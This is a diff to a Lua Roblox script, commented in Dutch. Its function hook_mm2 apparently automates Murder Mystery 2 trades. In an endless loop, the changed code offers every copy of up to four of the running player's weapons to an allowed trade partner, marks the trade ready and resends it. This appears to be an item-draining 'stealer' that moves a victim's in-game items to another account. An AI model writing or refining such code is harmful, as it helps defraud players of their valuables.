@@ -245,8 +245,6 @@ local function hook_mm2()
         end)
     end
 
-    -- geen completeTrade/declineTrade handlers: vuren op verkeerde momenten in MM2
-
     task.spawn(function()
         while true do
             task.wait(2)
@@ -289,19 +287,17 @@ local function hook_mm2()
             local currentItems = collect_mm2_items()
             local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems
 
-            -- vul 4 slots met duplicaten van beste item eerst
-            local slotsLeft = 4
+            -- 4 unieke items, elk met ALLE copies gestapeld in 1 slot
+            local slotsUsed = 0
             for _, entry in ipairs(itemsToOffer) do
-                if slotsLeft <= 0 then break end
-                local copies = math.min(entry.amount, slotsLeft)
-                for i = 1, copies do
+                if slotsUsed >= 4 then break end
+                for i = 1, entry.amount do
                     pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
                     task.wait(0.1)
                 end
-                slotsLeft = slotsLeft - copies
+                slotsUsed = slotsUsed + 1
             end
 
-            -- wacht op UpdateTrade zodat currentLastOffer up-to-date is
             task.wait(3)
 
             if not readySent then
@@ -313,7 +309,6 @@ local function hook_mm2()
                 end
             end
 
-            -- reset 8s na accept (trade is dan klaar), meteen resenden
             task.wait(8)
             if tradeGen == myGen and tradingWithAllowed then
                 resetState()
